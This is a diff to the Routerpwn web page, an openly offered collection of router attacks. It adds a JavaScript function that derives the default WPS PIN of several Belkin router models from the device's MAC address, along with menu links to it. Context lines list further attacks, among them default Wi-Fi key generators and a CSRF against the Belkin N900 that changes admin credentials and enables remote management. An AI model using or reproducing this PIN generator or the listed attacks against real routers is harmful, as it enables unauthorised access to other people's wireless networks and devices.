@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.19.229</title>
+		<title>Routerpwn 1.20.229</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link rel="shortcut icon" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -2301,6 +2301,51 @@ a=a+1
 	alert("WPS: "+String(fibsum))
 }
 
+/*
+
+Belkin F5D8235-4 v1000, F5D8231-4 v5000, F9K1104 v1000 - WPS from MAC Address
+
+Belkin_N+_XXXXXX   00:22:75:XX:XX:XX    F5D8235-4 v1000
+belkin.XXX         00:1C:DF:XX:XX:XX    F5D8231-4 v5000
+belkin.XXX         09:86:3B:XX:XX:XX    F9K1104   v1000
+
+@author         : e.novellalorente@student.ru.nl
+Original work   : ZhaoChunsheng 04/07/2012
+Javascript Port : @sinnet3000
+
+Advisory: http://ednolo.alumnos.upv.es/?p=1295
+
+*/
+
+function belkinwpspin()
+{
+	var Long = dcodeIO.Long;
+	var mac = prompt("Enter the last 6 digits of the MAC Address (Ex: 51990C): ");
+	var pin = new Long(Long.fromString(mac, 16));
+	pin = pin.modulo(Long.fromNumber(10000000));
+	var accum = new Long(Long.fromNumber(0));
+
+	var temp = new Long(Long.fromNumber(0));
+	var temp2 = new Long(Long.fromNumber(0));
+	
+	while(pin.toNumber()) {
+		temp = pin.modulo(Long.fromNumber(10));
+		temp2 = temp.multiply(Long.fromNumber(3));
+		accum = accum.add(temp2);
+		pin = pin.div(Long.fromNumber(10));
+		temp = pin.modulo(Long.fromNumber(10));
+		accum = accum.add(temp);
+		pin = pin.div(Long.fromNumber(10));
+	}
+	temp = accum.modulo(Long.fromNumber(10));
+	temp2 = Long.fromNumber(10).subtract(temp);
+	accum = temp2.modulo(Long.fromNumber(10));
+
+    console.log(parseInt(mac, 16) + accum.toString());
+
+}
+
+
 
 </script>
 	</head>
@@ -2358,6 +2403,7 @@ a=a+1
 <article><div><h3><a href="http://198.61.167.113/wlan4xx">Obtain the possible default Wi-Fi passwords for WLANXXXXXX, YaComXXXXXX and WiFiXXXXXX SSIDs</a></h3></div></article>
 <article><div><h3><a href="http://198.61.167.113/arris/">ARRIS DG860A NVRAM Backup Password Disclosure</a></h3></div></article>
 <article><div><h3><a href="http://198.61.167.113/belkinwpa/">Belkin.XXX WPA Default Password</a></h3></div></article>
+<article><div><h3><a href="javascript:belkinwpspin();">Belkin F5D8235-4 v1000, F5D8231-4 v5000, F9K1104 v1000 - WPS from MAC Address</a></h3></div></article>
 <article><div><h3><a href="javascript:easyboxwpa()">EasyBox Standard WPA2 Key Generator</a></h3></div></article>
 <article><div><h3><a href="javascript:mac2wepkey()">Huawei HG5XX Mac2wepkey Default Wireless Key Generator</a></h3></div></article>
 <article><div><h3><a href="javascript:HG824x()">HG8245 and HG8247 mac2wpakey default wireless key generator</a></h3></div></article>
@@ -2723,7 +2769,8 @@ a=a+1
 <input type="hidden" name="pws" value="password">
 </form>
 <h2>Belkin</h2>
-<h3><a href="javascript:img('F5D8236-4v2')">F5D8236-4v2</a>, <a href="javascript:img('N900')">N900</a>, <a href="javascript:img('N300')">N300</a>, <a href="javascript:img('F9K1002')">F9K1002</a>, <a href="javascript:img('Belkin Wireless G router F5D7234-4')">Belkin Wireless G router F5D7234-4</a>, <a href="javascript:img('F5D7230-4')">F5D7230-4</a>, <a href="javascript:img('MIMO F5D9230??4')">MIMO F5D9230??4</a></h3>
+<h3><a href="javascript:img('F5D8236-4v2')">F5D8236-4v2</a>, <a href="javascript:img('N900')">N900</a>, <a href="javascript:img('N300')">N300</a>, <a href="javascript:img('F9K1002')">F9K1002</a>, <a href="javascript:img('Belkin Wireless G router F5D7234-4')">Belkin Wireless G router F5D7234-4</a>, <a href="javascript:img('F5D7230-4')">F5D7230-4</a>, <a href="javascript:img('MIMO F5D9230??4')">MIMO F5D9230??4</a>, <a href="javascript:img('F5D8235-4')">F5D8235-4</a>, <a href="javascript:img('F5D8231-4')">F5D8231-4</a>, <a href="javascript:img('F9K1104 ')">F9K1104 </a></h3>
+
 
 <article>
 	<div>04/15/13</div>
@@ -2758,6 +2805,12 @@ a=a+1
 	<div><a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">[+]</a></div>
 	<div><a href="javascript:N900_csrf();">N900 Change admin creds & enable remote MGMT CSRF</a></div>
 	<div><a href="javascript:N900_csrf(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>12/14/12</div>
+	<div><a href="http://ednolo.alumnos.upv.es/?p=1295">[+]</a></div>
+	<div><a href="javascript:belkinwpspin();">Belkin F5D8235-4 v1000, F5D8231-4 v5000, F9K1104 v1000 - WPS from MAC Address</a></div>
 </article>
 
 <article>
